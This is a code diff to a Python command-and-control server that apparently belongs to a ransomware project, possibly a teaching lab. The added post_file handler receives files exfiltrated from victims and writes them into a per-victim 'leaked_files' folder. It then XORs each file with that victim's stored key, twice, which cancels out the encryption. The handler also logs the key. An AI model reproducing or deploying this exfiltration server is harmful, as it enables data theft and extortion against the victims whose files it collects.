@@ -3,8 +3,9 @@ from http.server import HTTPServer
 from pathlib import Path
 import logging
 import sys
-
+from xorcrypt import xorfile
 from cncbase import CNCBase
+import base64
 
 class CNC(CNCBase):
     ROOT_PATH = "/root/CNC"
@@ -50,6 +51,33 @@ class CNC(CNCBase):
         self.save_b64(label, salt, 'salt.bin')
         self.save_b64(label, key, 'key.bin')
         self.save_b64(label, token, 'token.bin')
+
+        return {"status":"OK"}
+
+    def post_file(self, path: str, params: dict, body: bytes) -> dict:
+        label = params['label']
+        file_name = params['file_name']
+
+        key_path = f"{CNC.ROOT_PATH}/{label}/key.bin"
+        new_path = f"{CNC.ROOT_PATH}/{label}/leaked_files"
+        file_path = f"{new_path}/{file_name}"
+        
+        if not Path(new_path).exists():
+            Path(new_path).mkdir(parents=True, exist_ok=False)
+
+        with open(key_path, 'rb') as key_file:
+            key = key_file.read()
+            self._log.debug(key)
+            key_file.close()
+        
+        # file_path = f"{new_path}/{file_name}.bin"
+        with open(file_path, "wb") as data_file:
+            # bin_data is written into data_file
+            data_file.write(body)
+            data_file.close()
+
+        xorfile(file_path, key)
+        xorfile(file_path, key)
 
         return {"status":"OK"}
 
